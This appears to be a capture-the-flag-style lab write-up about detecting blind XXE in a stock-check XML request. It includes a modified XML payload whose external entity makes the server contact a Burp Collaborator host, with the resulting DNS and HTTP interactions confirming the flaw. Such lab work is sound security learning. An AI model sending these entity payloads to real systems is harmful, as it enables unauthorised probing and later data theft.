@@ -1,0 +1,50 @@
+Blind XXE with Out-of-Band Interaction
+
+**Category**: XXE  
+**Difficulty**: Practitioner  
+
+---
+
+## Overview / What I Learned
+
+This lab demonstrates a **blind XXE vulnerability** where the response does not reveal any information, but an **out-of-band interaction** can be used to detect XML external entity processing.
+I learned how to use **Burp Collaborator** to confirm the vulnerability via **DNS/HTTP interactions**.
+
+---
+
+## Exploit Steps / Attack Methodology
+
+### 1. Identifying the Target
+
+- Navigated to a product page and used the "Check stock" feature.
+- Intercepted the HTTP POST request in Burp Suite.
+- Found that the request body used XML to submit product and store IDs.
+
+### 2. Modifying the Request
+
+- Injected an external entity referencing my Burp Collaborator domain.
+- Replaced the `productId` value with the entity reference.
+
+Modified Request:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE stockCheck [
+  <!ENTITY xxe SYSTEM "http://collabId.burpcollaborator.com">
+]>
+<stockCheck>
+  <productId>&xxe;</productId>
+  <storeId>1</storeId>
+</stockCheck>
+Sent the modified request to the server.
+
+3. Observing the OAST Response
+Switched to the Burp Collaborator tab and clicked "Poll now".
+Received DNS and HTTP interactions from the lab server.
+This confirmed that the server parsed and fetched the external entity, proving the XXE vulnerability.
+
+
+Key Takeaways
+Blind XXE vulnerabilities do not return data in the HTTP response.
+Out-of-band detection using Burp Collaborator is crucial for finding blind vulnerabilities.
+Always test for external entity resolution even if the response seems normal or unchanged.
